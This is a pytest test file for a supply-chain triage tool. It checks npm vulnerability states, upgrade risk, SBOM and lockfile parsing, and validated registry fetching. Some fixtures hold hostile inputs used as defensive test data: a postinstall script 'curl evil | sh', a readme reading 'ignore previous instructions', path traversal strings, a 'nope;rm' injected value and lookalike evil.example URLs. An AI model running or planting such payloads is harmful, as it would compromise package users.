"""No-fix classification, upgrade risk, inventory and registry discovery. Offline."""
import json
from datetime import datetime, timedelta, timezone

import pytest

from doublestrain import inventory, nofix, registry
from doublestrain.inventory import APP, Component, Parent
from doublestrain.nofix import affected, classify, upgrade_risk
from doublestrain.pkgsrc import Rejected
from doublestrain.semver import parse, satisfies


def _iso(days_ago: float) -> str:
    return (datetime.now(timezone.utc) - timedelta(days=days_ago)).isoformat().replace("+00:00", "Z")


def _pk(name, versions, *, latest=None, repo="git+https://github.com/o/r.git"):
    """versions: {v: (days_ago, meta)}"""
    return {"name": name, "repository": {"url": repo},
            "versions": {v: m for v, (_, m) in versions.items()},
            "time": {v: _iso(d) for v, (d, _) in versions.items()},
            "dist-tags": {"latest": latest or max(versions, key=parse)}}


def _rec(name, events, rid="GHSA-x", **kw):
    return {"id": rid, "aliases": [], "published": _iso(kw.pop("adv_days", 100)),
            "affected": [{"package": {"ecosystem": "npm", "name": name},
                          "ranges": [{"type": "SEMVER", "events": events}]}], **kw}


# --- semver + OSV ranges ------------------------------------------------------------
@pytest.mark.parametrize("v,r,want", [
    ("1.2.3", "^1.0.0", True), ("2.0.0", "^1.0.0", False), ("0.2.5", "^0.2.3", True), ("0.3.0", "^0.2.3", False),
    ("0.0.4", "^0.0.3", False), ("1.3.0", "~1.2.3", False), ("1.4.9", "1.2.0 - 1.4", True),
    ("2.1.0", "<1.0.0 || >=2.0.0", True), ("1.2.3-beta", "^1.2.3-alpha", True), ("1.3.0-beta", "^1.2.3-alpha", False),
    ("1.2.3", "latest", None), ("1.2.3", "git+https://x/y.git", None), ("1.2.3", "npm:other@^1", None)])
def test_semver_ranges(v, r, want):
    assert satisfies(v, r) is want


def test_osv_events():
    recs = [_rec("p", [{"introduced": "0"}, {"fixed": "1.2.0"}, {"introduced": "2.0.0"}, {"last_affected": "2.1.0"}])]
    got = {v: affected(recs, "p", parse(v)) for v in ("1.1.9", "1.2.0", "1.9.0", "2.0.0", "2.1.0", "2.1.1")}
    assert got == {"1.1.9": True, "1.2.0": False, "1.9.0": False, "2.0.0": True, "2.1.0": True, "2.1.1": False}
    assert affected(recs, "other", parse("1.0.0")) is None


# --- states -------------------------------------------------------------------------
def _c(name="p", version="1.0.0", parents=(Parent(APP, "", "^1.0.0"),)):
    return Component(name, version, parents=list(parents))


V = lambda d=200, **m: (d, m)  # noqa: E731


def test_fix_available_with_low_risk():
    pk = _pk("p", {"1.0.0": V(300), "1.0.1": V(200), "1.1.0": V(100)})
    r = classify(_c(), ["CVE-1"], [_rec("p", [{"introduced": "0"}, {"fixed": "1.0.1"}])], pk, {})
    assert (r.state, r.patched[:2], r.risk.to, r.risk.level) == ("fix_available", ["1.0.1", "1.1.0"], "1.0.1", "low")


def test_blocked_by_parent_finds_the_parent_upgrade():
    pk = _pk("p", {"1.0.0": V(300), "1.0.1": V(200)})
    ppk = _pk("par", {"4.0.0": V(300, dependencies={"p": "1.0.0"}), "4.1.0": V(100, dependencies={"p": "^1.0.1"}),
                      "5.0.0": V(90, dependencies={"p": "^1.0.1"})})
    c = _c(parents=[Parent("par", "4.0.0", "1.0.0")])
    r = classify(c, ["CVE-1"], [_rec("p", [{"introduced": "0"}, {"fixed": "1.0.1"}])], pk, {"par": ppk})
    assert r.state == "blocked_by_parent" and r.blocking == ["par@4.0.0 requires '1.0.0'"]
    assert r.parent_fixes == ["par@4.1.0"]                       # same line before the major
    assert r.risk.level == "high" and any(s.startswith("outside declared range") for s in r.risk.current)


def test_fix_major_only():
    pk = _pk("p", {"1.0.0": V(300), "1.5.0": V(200), "2.0.0": V(100)})
    r = classify(_c(), ["CVE-1"], [_rec("p", [{"introduced": "0"}, {"fixed": "2.0.0"}])], pk, {})
    assert r.state == "fix_major_only" and r.risk.to == "2.0.0" and "semver-major" in r.risk.current


@pytest.mark.parametrize("pk_kw,rec_kw,events,state", [
    ({}, {}, [{"introduced": "0"}, {"fixed": "1.9.0"}], "fixed_unreleased"),
    ({}, {"details": "DISPUTED: the maintainer says this is by design"}, [{"introduced": "0"}], "wont_fix"),
    ({"old": True}, {}, [{"introduced": "0"}], "abandoned"),
    ({"later": True}, {"adv_days": 150}, [{"introduced": "0"}], "data_gap"),
    ({}, {"adv_days": 1}, [{"introduced": "0"}], "unfixed_upstream"),
])
def test_no_fix_states(pk_kw, rec_kw, events, state):
    age = 2000 if pk_kw.get("old") else 120
    vs = {"1.0.0": V(age + 100), "1.1.0": V(age)}
    if pk_kw.get("later"):
        vs["1.2.0"] = V(20)
    r = classify(_c(), ["CVE-1"], [_rec("p", events, **rec_kw)], _pk("p", vs), {})
    assert r.state == state and r.route == nofix.ROUTES[state]


def test_withdrawn_unknown_and_gap():
    pk = _pk("p", {"1.0.0": V(300)})
    assert classify(_c(), ["X"], [_rec("p", [], withdrawn="2026-01-01")], pk, {}).state == "withdrawn"
    assert classify(_c(version="1.0"), ["X"], [_rec("p", [{"introduced": "0"}])], pk, {}).state == "unknown"
    assert classify(_c(), ["X"], [_rec("p", [{"introduced": "0"}])], None, {}).state == "unknown"
    assert classify(_c(), ["X"], [{"id": "X", "affected": []}], pk, {}).state == "data_gap"


# --- upgrade risk -------------------------------------------------------------------
def _risk(a, b, **kw):
    pk = _pk("p", {"1.0.0": V(300, **a), "1.0.1": V(kw.pop("days", 100), **b)})
    return upgrade_risk(pk, "1.0.0", "1.0.1", **kw)


def test_new_install_script_and_stranger_publish_are_high():
    assert _risk({}, {"install_scripts": ["postinstall"]}).level == "high"
    who = lambda n: {"name": n}  # noqa: E731
    ms = [{"name": "alice"}]
    stranger = _risk({"_npmUser": who("alice"), "maintainers": ms}, {"_npmUser": who("mallory"), "maintainers": ms})
    handover = _risk({"_npmUser": who("alice"), "maintainers": ms + [{"name": "bob"}]},
                     {"_npmUser": who("bob"), "maintainers": ms + [{"name": "bob"}]})
    assert stranger.level == "high" and handover.level == "caution"


def test_breaking_signals_and_noise():
    r = _risk({"engines": {"node": ">=8"}, "main": "index.js"},
              {"engines": {"node": ">=18"}, "type": "module", "main": "dist/index.js"})
    assert r.level == "caution" and any("raised" in s for s in r.current) and any("ESM" in s for s in r.current)
    assert _risk({}, {"engines": {"node": ">=0.10"}}).level == "low"          # first declaration, not a raise
    assert _risk({"maintainers": [{"name": "a"}]}, {"maintainers": [{"name": "b"}]}).level == "low"   # info only
    assert "published" in _risk({}, {}, days=0.5).current[0]                  # too fresh


def test_history():
    vs = {"1.0.0": V(500, main="a.js"), "1.0.1": V(400, main="b.js"), "1.0.2": V(300, main="b.js",
          deprecated="broken release, use 1.0.3"), "1.0.3": V(200, main="b.js")}
    pk = _pk("p", vs)
    pk["time"]["1.0.4"] = _iso(150)                                            # unpublished
    h = upgrade_risk(pk, "1.0.0", "1.0.3").historic
    assert any(s.startswith("1/3 minor/patch") for s in h)
    assert any("deprecated as broken" in s for s in h) and any("unpublished" in s for s in h)


# --- inventory ----------------------------------------------------------------------
def test_cyclonedx_and_spdx(tmp_path):
    cdx = {"bomFormat": "CycloneDX", "metadata": {"component": {"bom-ref": "app"}},
           "components": [{"bom-ref": "e", "purl": "pkg:npm/express@4.18.2"},
                          {"bom-ref": "b", "purl": "pkg:npm/body-parser@1.20.1"},
                          {"bom-ref": "s", "purl": "pkg:npm/%40types/node@20.1.0", "scope": "excluded"},
                          {"bom-ref": "py", "purl": "pkg:pypi/requests@2.0.0"}],
           "dependencies": [{"ref": "app", "dependsOn": ["e", "s"]}, {"ref": "e", "dependsOn": ["b"]}]}
    (tmp_path / "bom.json").write_text(json.dumps(cdx))
    inv = inventory.load(tmp_path / "bom.json")
    assert set(inv.components) == {"express@4.18.2", "body-parser@1.20.1", "@types/node@20.1.0"}
    assert inv.components["express@4.18.2"].direct and inv.components["@types/node@20.1.0"].dev
    assert inv.components["body-parser@1.20.1"].parents == [Parent("express", "4.18.2", None)]
    assert inv.skipped == {"pypi": 1}
    n = inventory.fill_ranges(inv, {"express": _pk("express", {"4.18.2": V(1, dependencies={"body-parser": "1.20.1"})})})
    assert n == 1 and inv.components["body-parser@1.20.1"].parents[0].range == "1.20.1"

    spdx = {"spdxVersion": "SPDX-2.3", "documentDescribes": ["SPDXRef-app"],
            "packages": [{"SPDXID": "SPDXRef-e", "externalRefs": [{"referenceType": "purl",
                                                                  "referenceLocator": "pkg:npm/express@4.18.2"}]},
                         {"SPDXID": "SPDXRef-q", "externalRefs": [{"referenceType": "purl",
                                                                  "referenceLocator": "pkg:npm/qs@6.11.0"}]}],
            "relationships": [{"spdxElementId": "SPDXRef-app", "relationshipType": "DEPENDS_ON",
                               "relatedSpdxElement": "SPDXRef-e"},
                              {"spdxElementId": "SPDXRef-q", "relationshipType": "DEPENDENCY_OF",
                               "relatedSpdxElement": "SPDXRef-e"}]}
    (tmp_path / "spdx.json").write_text(json.dumps(spdx))
    inv = inventory.load(tmp_path / "spdx.json")
    assert inv.components["express@4.18.2"].direct
    assert inv.components["qs@6.11.0"].parents == [Parent("express", "4.18.2", None)]


def test_lockfile_ranges(tmp_path):
    lock = {"lockfileVersion": 3, "packages": {
        "": {"dependencies": {"express": "^4.18.0"}},
        "node_modules/express": {"version": "4.18.2", "dependencies": {"body-parser": "1.20.1"}},
        "node_modules/body-parser": {"version": "1.20.1"}}}
    (tmp_path / "package-lock.json").write_text(json.dumps(lock))
    inv = inventory.load(tmp_path)
    assert inv.components["express@4.18.2"].parents == [Parent(APP, "", "^4.18.0")]
    assert inv.components["express@4.18.2"].direct
    assert inv.components["body-parser@1.20.1"].parents == [Parent("express", "4.18.2", "1.20.1")]


def test_not_an_sbom(tmp_path):
    (tmp_path / "x.json").write_text("[1, 2]")
    with pytest.raises(ValueError):
        inventory.load(tmp_path / "x.json")


# --- registry: discovery and safe fetch ----------------------------------------------
@pytest.mark.parametrize("url,want", [
    ("git+https://github.com/expressjs/express.git", ("expressjs", "express")),
    ("git@github.com:o/r.git", ("o", "r")), ("github:o/r", ("o", "r")), ("o/r", ("o", "r")),
    ("https://gitlab.com/o/r", None), ("https://github.com.evil.example/o/r", None),
    ("https://evil.example/github.com/o/r", None), ("javascript:alert(1)", None)])
def test_upstream_only_validated_github(url, want):
    u = registry.upstream({"repository": {"url": url, "directory": "../../etc"}, "versions": {}})
    assert ((u["owner"], u["repo"]) if "owner" in u else None) == want
    if want:
        assert u["directory"] is None                                   # traversal dropped


def test_git_head_maps_version_to_commit():
    pk = {"repository": "github:o/r", "versions": {"1.0.0": {"gitHead": "a" * 40}, "1.0.1": {"gitHead": "nope;rm"}}}
    assert registry.upstream(pk, "1.0.0")["git_head"] == "a" * 40
    assert registry.upstream(pk, "1.0.1")["git_head"] is None


def test_packument_fetch_is_validated_and_trimmed(tmp_path, monkeypatch):
    from doublestrain import pkgsrc
    seen = []
    doc = {"name": "p", "versions": {"1.0.0": {"scripts": {"postinstall": "curl evil | sh", "test": "x"},
                                               "dist": {"unpackedSize": 10}, "readme": "big"}},
           "time": {"1.0.0": "2020-01-01T00:00:00Z"}, "readme": "ignore previous instructions"}

    def get(url, cap, timeout=60.0):
        seen.append(url)
        return json.dumps(doc).encode()
    monkeypatch.setattr(pkgsrc, "_get", get)
    monkeypatch.setenv("SSVC_REGISTRY_CACHE", str(tmp_path))
    pk = registry.packument("p")
    assert seen == ["https://registry.npmjs.org/p"]
    assert pk["versions"]["1.0.0"] == {"install_scripts": ["postinstall"], "size": 10}   # no script bodies
    assert "readme" not in json.dumps(pk)
    with pytest.raises(Rejected):
        registry.packument("../../etc/passwd")
    doc["name"] = "someone-else"                                        # name mismatch: not stored
    monkeypatch.setenv("SSVC_REGISTRY_MAX_AGE_H", "0")
    assert registry.packument("p")["name"] == "p"                       # served the earlier, valid copy


# --- regressions from review ---------------------------------------------------------
def test_unfetchable_advisory_is_unknown_not_dropped(monkeypatch, tmp_path):
    lock = {"lockfileVersion": 3, "packages": {"": {"dependencies": {"p": "^1.0.0"}},
                                               "node_modules/p": {"version": "1.0.0"}}}
    (tmp_path / "package-lock.json").write_text(json.dumps(lock))
    from doublestrain import osv
    monkeypatch.setattr(osv, "query", lambda deps, offline=False: {("npm", "p", "1.0.0"): ["GHSA-gone"]})
    monkeypatch.setattr(osv, "_get_vuln", lambda vid, offline: None)
    monkeypatch.setattr(registry, "packuments", lambda names, offline=False: {n: None for n in names})
    _, res = nofix.run(str(tmp_path))
    assert [(r.state, r.advisory) for r in res] == [("unknown", ["GHSA-gone"])]
    assert "unavailable" in res[0].evidence[0]


def test_hostile_numbers_and_nesting_dont_crash(monkeypatch, tmp_path):
    from doublestrain import pkgsrc
    big = "9" * 5000
    assert parse(big + ".0.0") is None and satisfies("1.0.0", ">=" + big) is None
    pk = _pk("p", {"1.0.0": V(300, engines={"node": ">=" + big}), "1.0.1": V(200, engines={"node": ">=" + big})})
    assert upgrade_risk(pk, "1.0.0", "1.0.1").level in ("low", "caution")
    monkeypatch.setattr(pkgsrc, "_get", lambda url, cap, timeout=60.0: b"[" * 200_000 + b"]" * 200_000)
    monkeypatch.setenv("SSVC_REGISTRY_CACHE", str(tmp_path))
    assert registry.packument("p") is None


def test_unevaluable_parent_range_doesnt_block():
    pk = _pk("p", {"1.0.0": V(300), "1.0.1": V(200)})
    c = _c(parents=[Parent("par", "1.0.0", "npm:p@^1.0.0")])
    r = classify(c, ["X"], [_rec("p", [{"introduced": "0"}, {"fixed": "1.0.1"}])], pk, {})
    assert r.state == "fix_available" and any("not semver" in e for e in r.evidence)


def test_permissive_parent_range_admits_a_major_fix():
    pk = _pk("p", {"1.0.0": V(300), "2.0.0": V(200)})
    c = _c(parents=[Parent("par", "1.0.0", ">=1.0.0")])
    r = classify(c, ["X"], [_rec("p", [{"introduced": "0"}, {"fixed": "2.0.0"}])], pk, {})
    assert r.state == "fix_available" and "semver-major" in r.risk.current


def test_unreleased_same_line_fix_beats_major_only():
    pk = _pk("p", {"1.0.0": V(300), "2.0.0": V(250), "2.0.1": V(200)})
    recs = [_rec("p", [{"introduced": "0"}, {"fixed": "1.0.5"}, {"introduced": "2.0.0"}, {"fixed": "2.0.1"}])]
    r = classify(_c(), ["X"], recs, pk, {})
    assert r.state == "fixed_unreleased" and any("1.0.5" in e for e in r.evidence)


def test_prerelease_only_fix_and_not_affected():
    pk = _pk("p", {"1.0.0": V(300), "1.0.1-beta.1": V(200)})
    r = classify(_c(), ["X"], [_rec("p", [{"introduced": "0"}, {"fixed": "1.0.1-beta.1"}])], pk, {})
    assert r.state == "fix_prerelease_only"
    r = classify(_c(), ["X"], [_rec("p", [{"introduced": "2.0.0"}, {"fixed": "2.0.1"}])], pk, {})
    assert r.state == "not_affected" and r.risk is None


@pytest.mark.parametrize("text,state", [
    ("Originally disputed by the vendor, the issue was later confirmed.", "unfixed_upstream"),
    ("** DISPUTED ** The maintainer says this is expected.", "wont_fix"),
    ("This is not a vulnerability in the usual setup but here is how ...", "unfixed_upstream")])
def test_disputed_needs_a_real_marker(text, state):
    pk = _pk("p", {"1.0.0": V(300), "1.1.0": V(120)})
    r = classify(_c(), ["X"], [_rec("p", [{"introduced": "0"}], details=text, adv_days=1)], pk, {})
    assert r.state == state


def test_app_pin_must_be_edited():
    pk = _pk("p", {"1.0.0": V(300), "1.0.1": V(200)})
    r = classify(_c(parents=[Parent(APP, "", "1.0.0")]), ["X"], [_rec("p", [{"introduced": "0"}, {"fixed": "1.0.1"}])], pk, {})
    assert r.state == "fix_available" and "must be edited" in r.evidence[-1] and r.risk.level == "high"


def test_sbom_without_graph_says_so(tmp_path):
    cdx = {"bomFormat": "CycloneDX", "components": [{"bom-ref": "q", "purl": "pkg:NPM/qs@6.0.0"}]}
    (tmp_path / "b.json").write_text(json.dumps(cdx))
    inv = inventory.load(tmp_path / "b.json")
    assert not inv.graph and "qs@6.0.0" in inv.components
    pk = _pk("qs", {"6.0.0": V(300), "6.0.1": V(200)})
    r = classify(inv.components["qs@6.0.0"], ["X"], [_rec("qs", [{"introduced": "0"}, {"fixed": "6.0.1"}])],
                 pk, {}, graph=False)
    assert any("no dependency graph" in e for e in r.evidence)


def test_sbom_root_is_the_app_even_with_an_npm_purl(tmp_path):
    spdx = {"spdxVersion": "SPDX-2.3", "documentDescribes": ["SPDXRef-app"],
            "packages": [{"SPDXID": "SPDXRef-app", "externalRefs": [{"referenceType": "purl",
                                                                    "referenceLocator": "pkg:npm/private-app@1.0.0"}]},
                         {"SPDXID": "SPDXRef-e", "externalRefs": [{"referenceType": "purl",
                                                                  "referenceLocator": "pkg:npm/express@4.18.2"}]}],
            "relationships": [{"spdxElementId": "SPDXRef-app", "relationshipType": "DEPENDS_ON",
                               "relatedSpdxElement": "SPDXRef-e"}]}
    (tmp_path / "s.json").write_text(json.dumps(spdx))
    inv = inventory.load(tmp_path / "s.json")
    assert set(inv.components) == {"express@4.18.2"}                 # the private name is never a component
    assert inv.components["express@4.18.2"].direct


def test_workspace_packages_are_the_app(tmp_path):
    lock = {"lockfileVersion": 3, "packages": {
        "": {"dependencies": {"ws-a": "*"}},
        "packages/a": {"name": "ws-a", "version": "0.0.1", "dependencies": {"qs": "^6.0.0"}},
        "node_modules/ws-a": {"resolved": "packages/a", "link": True},
        "node_modules/qs": {"version": "6.0.0"}}}
    (tmp_path / "package-lock.json").write_text(json.dumps(lock))
    inv = inventory.load(tmp_path)
    assert set(inv.components) == {"qs@6.0.0"}
    assert inv.components["qs@6.0.0"].parents == [Parent(APP, "", "^6.0.0")]


def test_registry_cache_is_case_exact(tmp_path, monkeypatch):
    from doublestrain import pkgsrc
    monkeypatch.setenv("SSVC_REGISTRY_CACHE", str(tmp_path))
    monkeypatch.setattr(pkgsrc, "_get", lambda url, cap, timeout=60.0: json.dumps(
        {"name": url.rsplit("/", 1)[1], "versions": {}}).encode())
    assert registry.packument("jsonstream")["name"] == "jsonstream"
    assert registry.packument("JSONStream", offline=True) is None     # not jsonstream's cache file
    assert registry.packument("JSONStream")["name"] == "JSONStream"


def test_name_validation_rejects_trailing_newline():
    with pytest.raises(Rejected):
        registry.packument("foo\n")
    assert registry.upstream({"repository": "github:o/...", "versions": {}}).get("error")
    assert registry.upstream({"repository": {"url": "github:o/r", "directory": "..\\..\\etc"},
                              "versions": {}})["directory"] is None


def test_malformed_osv_events_are_unknown_not_unaffected():
    recs = [_rec("p", [{"introduced": "not-a-version"}, {"fixed": "1.0.1"}])]
    assert affected(recs, "p", parse("1.0.0")) is None
    pk = _pk("p", {"1.0.0": V(300), "1.0.1": V(200)})
    assert classify(_c(), ["X"], recs, pk, {}).state == "data_gap"
